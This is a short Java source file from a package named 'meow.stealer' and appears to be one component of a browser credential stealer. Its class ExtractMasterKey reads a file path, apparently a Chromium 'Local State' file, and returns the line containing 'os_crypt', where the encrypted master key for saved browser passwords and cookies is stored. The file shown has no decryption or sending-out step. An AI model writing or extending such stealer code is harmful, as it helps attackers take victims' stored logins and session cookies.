package meow.stealer;

import java.io.File;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

public class ExtractMasterKey {
    public static String masterKey(String path) throws IOException {
        if(path == null) {
            System.out.println("-1");
            return null;
        }

        if(!Paths.get(path).toFile().exists()) {
            System.out.println("-2");
            return null;
        }

        Path localState = Paths.get(path);
        String masterKey = null;

        for (String line : Files.readAllLines(localState)) {
            if (!line.contains("os_crypt")) {
                continue;
            }
            masterKey = line;
        }

        System.out.println("0");
        return masterKey;
    }
}
